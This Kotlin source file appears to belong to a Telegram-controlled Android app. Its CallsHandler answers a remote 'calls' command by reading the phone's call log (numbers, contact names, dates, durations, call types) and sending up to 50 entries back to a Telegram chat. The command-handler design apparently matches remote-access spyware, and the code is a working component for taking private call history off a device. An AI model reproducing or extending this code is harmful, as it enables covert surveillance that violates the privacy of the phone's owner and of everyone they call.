package com.soll.domain.command.handlers

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.provider.CallLog
import androidx.core.content.ContextCompat
import com.soll.data.api.model.Message
import com.soll.data.repository.TelegramRepository
import com.soll.domain.command.CommandHandler
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class CallsHandler(
    context: Context,
    telegramRepository: TelegramRepository
) : CommandHandler(context, telegramRepository) {

    override val command = "calls"
    override val description = "View call log"

    private val dateFormat = SimpleDateFormat("dd.MM.yyyy HH:mm", Locale.getDefault())

    override suspend fun execute(message: Message, args: String?) {
        if (!hasPermission()) {
            reply(message, "Call log permission not granted. Please grant READ_CALL_LOG permission in app settings.")
            return
        }

        val count = args?.toIntOrNull() ?: 15
        val limitedCount = count.coerceIn(1, 50)

        val calls = readCallLog(limitedCount)

        if (calls.isEmpty()) {
            reply(message, "No call records found.")
            return
        }

        val text = buildString {
            append("<b>📞 Last $limitedCount Calls</b>\n\n")

            calls.forEachIndexed { index, call ->
                val icon = when (call.type) {
                    CallLog.Calls.INCOMING_TYPE -> "📥"
                    CallLog.Calls.OUTGOING_TYPE -> "📤"
                    CallLog.Calls.MISSED_TYPE -> "📵"
                    CallLog.Calls.REJECTED_TYPE -> "🚫"
                    CallLog.Calls.BLOCKED_TYPE -> "⛔"
                    else -> "📞"
                }

                val typeText = when (call.type) {
                    CallLog.Calls.INCOMING_TYPE -> "Incoming"
                    CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                    CallLog.Calls.MISSED_TYPE -> "Missed"
                    CallLog.Calls.REJECTED_TYPE -> "Rejected"
                    CallLog.Calls.BLOCKED_TYPE -> "Blocked"
                    else -> "Unknown"
                }

                append("<b>${index + 1}.</b> $icon ")

                if (call.name != null) {
                    append("<b>${call.name}</b>\n")
                    append("    ${call.number}\n")
                } else {
                    append("<b>${call.number}</b>\n")
                }

                append("    $typeText • ${formatDuration(call.duration)}\n")
                append("    <i>${call.date}</i>\n\n")
            }
        }

        reply(message, text)
    }

    private fun hasPermission(): Boolean {
        return ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.READ_CALL_LOG
        ) == PackageManager.PERMISSION_GRANTED
    }

    private fun readCallLog(count: Int): List<CallData> {
        val calls = mutableListOf<CallData>()

        var cursor: Cursor? = null
        try {
            cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION,
                    CallLog.Calls.TYPE
                ),
                null,
                null,
                "${CallLog.Calls.DATE} DESC LIMIT $count"
            )

            cursor?.let {
                val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
                val nameIndex = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                val dateIndex = it.getColumnIndex(CallLog.Calls.DATE)
                val durationIndex = it.getColumnIndex(CallLog.Calls.DURATION)
                val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)

                while (it.moveToNext()) {
                    calls.add(
                        CallData(
                            number = it.getString(numberIndex) ?: "Unknown",
                            name = it.getString(nameIndex),
                            date = dateFormat.format(Date(it.getLong(dateIndex))),
                            duration = it.getLong(durationIndex),
                            type = it.getInt(typeIndex)
                        )
                    )
                }
            }
        } finally {
            cursor?.close()
        }

        return calls
    }

    private fun formatDuration(seconds: Long): String {
        return when {
            seconds == 0L -> "0s"
            seconds < 60 -> "${seconds}s"
            seconds < 3600 -> "${seconds / 60}m ${seconds % 60}s"
            else -> "${seconds / 3600}h ${(seconds % 3600) / 60}m"
        }
    }

    private data class CallData(
        val number: String,
        val name: String?,
        val date: String,
        val duration: Long,
        val type: Int
    )
}
